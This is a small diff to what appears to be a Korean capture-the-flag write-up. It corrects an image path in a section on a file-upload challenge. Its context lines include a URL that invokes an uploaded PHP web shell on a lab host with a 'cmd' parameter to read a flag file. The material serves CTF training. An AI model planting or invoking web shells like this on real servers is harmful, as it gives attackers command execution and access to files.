@@ -40,7 +40,7 @@
 http://edu.arang.kr:9501/uploads/shell.phtml?cmd=cat%20/flag_upload.txt
 ```
 
-![웹쉘 실행으로 flag 확인](.images/upload_shell_flag.png)
+![웹쉘 실행으로 flag 확인](./images/upload_shell_flag.png)
 
 ## 플래그
 
